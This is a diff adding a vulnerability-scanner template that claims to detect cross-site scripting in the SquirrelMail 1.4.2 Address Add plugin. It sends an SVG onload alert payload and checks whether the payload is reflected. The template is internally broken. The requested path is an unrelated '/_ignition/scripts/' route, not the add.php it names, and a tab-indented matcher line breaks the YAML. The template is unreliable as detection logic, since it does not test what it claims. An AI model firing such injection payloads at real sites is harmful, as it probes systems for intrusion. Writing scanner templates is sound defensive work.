@@ -1,0 +1,31 @@
+id: squirrelmail-address-xss
+
+info:
+  name: SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting
+  author: dhiyaneshDk
+  severity: medium
+  description: SquirrelMail Address Add Plugin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+  reference: https://www.exploit-db.com/exploits/26305
+  tags: xss,squirrelmail,plugin
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert('{{randstr}}')>'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+		      - "('{{randstr}}')"
+          - "--><svg onload=alert"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
